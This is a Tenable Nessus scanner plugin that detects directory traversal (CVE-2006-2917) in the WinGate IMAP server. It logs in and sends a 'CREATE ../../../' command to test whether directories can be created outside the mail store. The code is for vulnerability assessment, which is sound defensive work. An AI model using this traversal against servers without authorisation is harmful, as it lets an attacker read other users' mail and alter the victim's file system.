#
# (C) Tenable Network Security
#



include("compat.inc");

if (description)
{
  script_id(22022);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-2917");
  script_bugtraq_id(18908);
  script_osvdb_id(27114);

  script_name(english:"WinGate IMAP Server Directory Traversal Vulnerabilities");
  script_summary(english:"Tries to create a directory in WinGate's main directory");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is prone to multiple directory traversal
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running WinGate, a Windows application
for managing and securing Internet access. 

The version of WinGate installed on the remote host fails to remove
directory traversal sequences from the 'CREATE', 'SELECT', 'DELETE',
'RENAME', 'COPY', 'APPEND', and 'LIST' commands before using them to
access messages.  An authenticated attacker may be able to exploit
this issue to read mail belong to other users and to create / rename /
delete arbitrary directories on the affected system." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2006-48/advisory/" );
 script_set_attribute(attribute:"see_also", value:"http://forums.qbik.com/viewtopic.php?t=4215" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WinGate 6.1.4 Build 1099 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/07/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/10");
 script_cvs_date("$Date: 2015/09/24 23:21:22 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like WinGate's, unless we're paranoid.
s = recv_line(socket:soc, length:1024);
if (
  report_paranoia < 2 &&
  (!strlen(s) || "* OK WinGate IMAP4rev1 service" >!< s)
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
#
# nb: SELECT seems to return OK regardless of whether the directory
#     actually exists in a vulnerable version. 
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  # Create a mailbox in the software's main directory.
  mailbox = string(SCRIPT_NAME, "-", unixtime());
  c = string("nessus", string(tag), " CREATE ../../../", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful; eg,
  # "OK CREATE folder created" vs "NO access denied".
  if (resp && resp =~ "OK" && "CREATE folder created" >< s) {
    if (report_verbosity > 0) {
      report = string(
        "Nessus was able to create the following directory on the remote\n",
        "host, under the directory in which WinGate is installed:\n",
        "\n",
        "  ", mailbox
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  debug_print("couldn't login with supplied imap credentials!", level:1);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
